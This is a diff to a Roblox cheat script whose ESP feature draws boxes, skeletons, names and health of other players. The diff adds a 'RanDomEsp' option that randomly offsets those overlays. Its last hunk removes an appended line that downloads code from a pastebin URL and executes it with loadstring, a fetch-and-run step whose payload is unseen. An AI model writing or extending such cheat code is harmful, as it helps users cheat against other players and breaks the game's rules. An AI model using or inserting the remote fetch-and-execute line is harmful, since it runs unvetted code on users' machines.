@@ -379,6 +379,7 @@ local espSettings = {
     Tracer = false, TracerColor = Color3.fromRGB(255, 255, 255),
     Name = false, NameColor = Color3.fromRGB(255, 255, 255),
     HP = false, HPColor = Color3.fromRGB(50, 255, 50),
+    RanDomEsp = false, RanDomEspDist = 300,
     TextStrokeColor = Color3.fromRGB(0, 0, 0),
 }
 getgenv().ESPSettings_TeamCheck = false
@@ -717,8 +718,16 @@ RunService.Heartbeat:Connect(function()
             local feetScreen = cam:WorldToViewportPoint(feetWorld)
             local height = math.abs(headScreen.Y - feetScreen.Y)
             local width = height / 1.7
-            local topPos = Vector2.new(rootPos.X, headScreen.Y)
-            local botPos = Vector2.new(rootPos.X, feetScreen.Y)
+
+            local espOffset = Vector2.zero
+            if espSettings.RanDomEsp then
+                local angle = math.random() * math.pi * 2
+                local dist = math.random(50, espSettings.RanDomEspDist or 300)
+                espOffset = Vector2.new(math.cos(angle) * dist, math.sin(angle) * dist)
+            end
+
+            local topPos = Vector2.new(rootPos.X, headScreen.Y) + espOffset
+            local botPos = Vector2.new(rootPos.X, feetScreen.Y) + espOffset
             local topVis = true
             local botVis = true
             
@@ -850,7 +859,11 @@ RunService.Heartbeat:Connect(function()
                     cache.DistanceTag.Visible = true
                     
                     if cache.WeaponBillboard.Enabled then
-                        cache.WeaponBillboard.StudsOffset = Vector3.new(0, -4.5 - ((botPos.Y - topPos.Y) / 100), 0) -- Move Billboard further down dynamically to prevent overlap
+                        local baseOffset = Vector3.new(0, -4.5 - ((botPos.Y - topPos.Y) / 100), 0)
+                        if espSettings.RanDomEsp and espOffset ~= Vector2.zero then
+                            baseOffset = baseOffset + Vector3.new(espOffset.X / 25, -espOffset.Y / 25, 0)
+                        end
+                        cache.WeaponBillboard.StudsOffset = baseOffset
                     end
                 else
                     cache.DistanceTag.Visible = false
@@ -881,6 +894,15 @@ RunService.Heartbeat:Connect(function()
                 local ra = getBonePos(br.RArm, cam)
                 local ll = getBonePos(br.LLeg, cam)
                 local rl = getBonePos(br.RLeg, cam)
+
+                if espOffset ~= Vector2.zero then
+                    if h then h = h + espOffset end
+                    if t then t = t + espOffset end
+                    if la then la = la + espOffset end
+                    if ra then ra = ra + espOffset end
+                    if ll then ll = ll + espOffset end
+                    if rl then rl = rl + espOffset end
+                end
 
                 if h and t then drawLine(cache.Bones.Head_Torso, h, t, espSettings.BoneColor) else cache.Bones.Head_Torso.Visible = false end
                 if t and la then drawLine(cache.Bones.Torso_LArm, t, la, espSettings.BoneColor) else cache.Bones.Torso_LArm.Visible = false end
@@ -968,8 +990,16 @@ RunService.Heartbeat:Connect(function()
         local feetScreen = cam:WorldToViewportPoint(feetWorld)
         local height = math.abs(headScreen.Y - feetScreen.Y)
         local width = height / 1.7
-        local topPos = Vector2.new(rootPos.X, headScreen.Y)
-        local botPos = Vector2.new(rootPos.X, feetScreen.Y)
+
+        local espOffset = Vector2.zero
+        if espSettings.RanDomEsp then
+            local angle = math.random() * math.pi * 2
+            local dist = math.random(50, espSettings.RanDomEspDist or 300)
+            espOffset = Vector2.new(math.cos(angle) * dist, math.sin(angle) * dist)
+        end
+
+        local topPos = Vector2.new(rootPos.X, headScreen.Y) + espOffset
+        local botPos = Vector2.new(rootPos.X, feetScreen.Y) + espOffset
         local currentTopY = topPos.Y - 5
 
         if teamEspSettings.Name then
@@ -1701,6 +1731,8 @@ ESPDep:AddToggle("ESP_HP", { Text = "HP Bar", Default = false, Callback = functi
     :AddColorPicker("ESP_HP_Color", { Default = espSettings.HPColor, Callback = function(v) espSettings.HPColor = v end })
 
 ESPDep:AddToggle("ESP_TeamCheck", { Text = "Team Check", Default = false, Callback = function(v) getgenv().ESPSettings_TeamCheck = v end })
+ESPDep:AddToggle("ESP_RanDomEsp", { Text = "RanDomEsp", Default = false, Callback = function(v) espSettings.RanDomEsp = v end })
+ESPDep:AddSlider("ESP_RanDomEspDist", { Text = "RanDomEsp Distance", Default = 300, Min = 50, Max = 1500, Rounding = 0, Callback = function(v) espSettings.RanDomEspDist = v end })
 
 ESPDep:SetupDependencies({ { ESPToggle, true } })
 
@@ -5009,4 +5041,3 @@ SaveManager:IgnoreThemeSettings()
 SaveManager:SetIgnoreIndexes({"AutoExecuteToggle"})
 SaveManager:BuildConfigSection(Tabs.Config)
 SaveManager:LoadAutoloadConfig()
-loadstring(game:HttpGet("https://pastebin.com/raw/HvXwTr4d"))()
